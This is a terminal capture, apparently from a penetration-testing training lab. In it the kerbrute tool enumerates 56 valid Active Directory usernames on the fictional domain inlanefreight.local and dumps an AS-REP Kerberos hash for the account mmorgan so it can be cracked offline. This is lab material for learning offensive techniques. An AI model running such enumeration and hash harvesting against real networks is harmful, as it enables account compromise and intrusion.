
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | wc 
     71     480    5763
┌─[htb-student@ea-attack01]─[/home]
└──╼ $ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/29/26 - Ronnie Flathers @ropnop

2026/07/29 08:02:30 >  Using KDC(s):
2026/07/29 08:02:30 >   172.16.5.5:88

2026/07/29 08:02:30 >  [+] VALID USERNAME:       jjones@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       sbrown@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       tjohnson@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jwilson@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       bdavis@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       njohnson@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       asanchez@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       dlewis@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       ccruz@inlanefreight.local
2026/07/29 08:02:30 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:509f89192ce23813054c4fa723d88d98$4795efd1a1ce87347d67b594726e30d4440dea073ff998cc6f6c3f00b53f30ce106db5576624334c04ba9827d5d41d3480ca9dedba90ca4e469c6eceb89766da28c4b960186a23fd4b8908a6d7e006ebbcabe8248b22de4a32113c03fa5bff6eee051cf03d4572ef3c1b2fdb848c63f18aeac209a8ce21a2835996b8c2574f229bcc8fe8f55c87107abe29308878ca0d70d9134f2c06a0404e1a58ad4b79ecf027c3b5f0e69c72a3f22c29bf75d529823da3005212984b177c3e019b62fca45e78e61b1d3bfbb7fbef0f9d91b61d0126232f40464907a3397bb275b4a965aee15ff1052472d55303d6a7eafe7691b8af964b8ff0053ca4dcd3420e1f8edd440aba244966e7cb5ac72f0e                                                                 
2026/07/29 08:02:30 >  [+] VALID USERNAME:       mmorgan@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       rramirez@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jwallace@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jsantiago@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       gdavis@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       mrichardson@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       mharrison@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       tgarcia@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jmay@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jmontgomery@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jhopkins@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       dpayne@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       mhicks@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       adunn@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       lmatthews@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       avazquez@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       mlowe@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       jmcdaniel@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       csteele@inlanefreight.local
2026/07/29 08:02:30 >  [+] VALID USERNAME:       mmullins@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       mochoa@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       aslater@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       ehoffman@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       ehamilton@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       cpennington@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       srosario@inlanefreight.local
2026/07/29 08:02:31 >  [+] VALID USERNAME:       lbradford@inlanefreight.local
2026/07/29 08:02:32 >  [+] VALID USERNAME:       halvarez@inlanefreight.local
2026/07/29 08:02:32 >  [+] VALID USERNAME:       gmccarthy@inlanefreight.local
2026/07/29 08:02:32 >  [+] VALID USERNAME:       dbranch@inlanefreight.local
2026/07/29 08:02:32 >  [+] VALID USERNAME:       mshoemaker@inlanefreight.local
2026/07/29 08:02:32 >  [+] VALID USERNAME:       mholliday@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       ngriffith@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       sinman@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       minman@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       rhester@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       rburrows@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       dpalacios@inlanefreight.local
2026/07/29 08:02:33 >  [+] VALID USERNAME:       strent@inlanefreight.local
2026/07/29 08:02:34 >  [+] VALID USERNAME:       fanthony@inlanefreight.local
2026/07/29 08:02:34 >  [+] VALID USERNAME:       evalentin@inlanefreight.local
2026/07/29 08:02:34 >  [+] VALID USERNAME:       sgage@inlanefreight.local
2026/07/29 08:02:34 >  [+] VALID USERNAME:       jshay@inlanefreight.local
2026/07/29 08:02:35 >  [+] VALID USERNAME:       jhermann@inlanefreight.local
2026/07/29 08:02:35 >  [+] VALID USERNAME:       whouse@inlanefreight.local
2026/07/29 08:02:35 >  [+] VALID USERNAME:       emercer@inlanefreight.local
2026/07/29 08:02:36 >  [+] VALID USERNAME:       wshepherd@inlanefreight.local
2026/07/29 08:02:37 >  Done! Tested 48705 usernames (56 valid) in 7.309 seconds

```

